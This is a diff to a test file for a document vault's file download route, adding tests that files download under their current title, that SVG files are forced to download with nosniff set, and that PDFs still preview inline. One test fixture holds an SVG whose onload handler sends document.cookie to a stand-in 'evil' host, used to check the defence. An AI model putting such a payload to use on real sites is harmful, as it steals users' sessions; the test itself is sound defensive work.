@@ -5,7 +5,7 @@ import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { TRPCError } from "@trpc/server";
 
-type Doc = { sha256: string; mime: string; title: string };
+type Doc = { sha256: string; mime: string; title: string; effectiveTitle?: string };
 
 const docs = new Map<string, Doc>();
 
@@ -15,7 +15,9 @@ vi.mock("@/lib/trpc-server", () => ({
       bySha: async ({ sha256 }: { sha256: string }) => {
         const doc = docs.get(sha256);
         if (!doc) throw new TRPCError({ code: "NOT_FOUND", message: "no such document" });
-        return doc;
+        // bySha returns effectiveDocument(): the immutable evidence title AND
+        // the current one. The route has to pick, so the mock offers both.
+        return { ...doc, effectiveTitle: doc.effectiveTitle ?? doc.title };
       },
     },
   }),
@@ -60,6 +62,40 @@ describe("GET /api/files/[sha256]", () => {
     const res = await GET(new Request("http://localhost/api/files/x"),
       { params: Promise.resolve({ sha256 }) });
     expect(res.headers.get("content-type")).toBe("application/pdf");
+  });
+
+  it("downloads under the name the document has NOW, not the one it arrived with", async () => {
+    // Content-Disposition beats the <a download> attribute, so getting this
+    // wrong silently undoes every rename Martin makes.
+    const buf = Buffer.from("%PDF-1.4\nx");
+    const { sha256 } = await storeFile(vaultDir, buf);
+    registerDoc({ sha256, mime: "application/pdf", title: "scan_001",
+      effectiveTitle: "Beschikking bewind 2026" });
+    const res = await GET(new Request("http://localhost/api/files/x"),
+      { params: Promise.resolve({ sha256 }) });
+    expect(res.headers.get("content-disposition")).toContain("Beschikking%20bewind%202026");
+    expect(res.headers.get("content-disposition")).not.toContain("scan_001");
+  });
+
+  it("never serves an active type inline, and never lets the browser sniff", async () => {
+    // The stored mime is the SENDER's Content-Type header. Rendered inline on
+    // our origin, this SVG runs script with Martin's session.
+    const svg = Buffer.from(
+      `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil/'+document.cookie)"/>`);
+    const { sha256 } = await storeFile(vaultDir, svg);
+    registerDoc({ sha256, mime: "image/svg+xml", title: "bijlage.svg" });
+    const res = await GET(new Request("http://localhost/api/files/x"),
+      { params: Promise.resolve({ sha256 }) });
+    expect(res.headers.get("content-disposition")).toContain("attachment");
+    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
+  });
+
+  it("still serves a PDF inline, so the preview frame keeps working", async () => {
+    const { sha256 } = await storeFile(vaultDir, Buffer.from("%PDF-1.4\nx"));
+    registerDoc({ sha256, mime: "application/pdf", title: "letter.pdf" });
+    const res = await GET(new Request("http://localhost/api/files/x"),
+      { params: Promise.resolve({ sha256 }) });
+    expect(res.headers.get("content-disposition")).toContain("inline");
   });
 
   it("never lets a title inject a header", async () => {
